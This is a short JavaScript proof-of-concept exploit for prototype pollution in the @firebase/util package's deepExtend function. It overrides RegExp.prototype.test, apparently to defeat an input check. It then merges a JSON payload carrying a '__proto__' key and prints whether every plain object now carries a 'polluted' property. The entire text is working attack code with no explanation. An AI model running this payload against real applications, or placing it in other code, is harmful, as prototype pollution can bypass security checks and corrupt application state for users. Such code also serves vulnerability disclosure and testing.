RegExp.prototype.test = () => false;
console.log({}.polluted);
const utils = require('@firebase/util');
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
utils.deepExtend({}, source);
console.log({}.polluted);